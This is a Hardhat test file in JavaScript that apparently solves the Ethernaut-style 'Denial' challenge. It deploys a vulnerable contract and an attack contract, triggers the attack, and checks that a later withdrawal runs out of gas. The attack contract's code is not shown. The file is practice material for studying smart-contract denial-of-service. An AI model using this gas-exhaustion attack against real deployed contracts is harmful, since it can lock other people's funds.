require("@nomiclabs/hardhat-waffle");
const { expect } = require("chai");

const getBalance = ethers.provider.getBalance;

const toWei = (value) => ethers.utils.parseEther(value.toString());

describe("DenialAttack", function () {
  it("attacks", async () => {
    const [owner, user] = await ethers.getSigners();

    const Denial = await ethers.getContractFactory("Denial");
    const denial = await Denial.connect(user).deploy();
    await denial.deployed();

    await user.sendTransaction({ to: denial.address, value: toWei(1) });

    const DenialAttack = await ethers.getContractFactory("DenialAttack");
    const denialAttack = await DenialAttack.deploy();
    await denialAttack.deployed();

    await expect(() =>
      denialAttack.attack(denial.address)
    ).to.changeEtherBalance(owner, "58519850599000000");

    await denialAttack.attack(denial.address);

    let f;

    try {
      await denial.withdraw({ gasLimit: 1000000 });
    } catch (err) {
      f = err;
    }

    expect(f.message).to.equal("Transaction ran out of gas");
  });
});
